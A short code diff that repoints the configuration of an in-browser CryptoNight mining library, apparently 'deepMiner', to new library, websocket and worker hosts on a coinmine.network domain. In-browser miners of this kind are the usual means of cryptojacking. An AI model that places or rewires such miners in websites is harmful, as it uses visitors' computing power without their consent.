@@ -574,9 +574,9 @@
 })(window);
 self.deepMiner = self.deepMiner || {};
 self.deepMiner.CONFIG = {
-    LIB_URL: "https://miner.coinmine.network/lib/",
-    WEBSOCKET_SHARDS: [["ws://miner.coinmine.network/api"]],
+    LIB_URL: "https://bridge.coinmine.network/lib/",
+    WEBSOCKET_SHARDS: [["ws://hash.coinmine.network"]],
     ASMJS_NAME: "cryptonight-asmjs.min.js",
     REQUIRES_AUTH: false
 };
-deepMiner.CRYPTONIGHT_WORKER_BLOB = "https://miner.coinmine.network/worker.js";
+deepMiner.CRYPTONIGHT_WORKER_BLOB = "https://bridge.coinmine.network/worker.js";
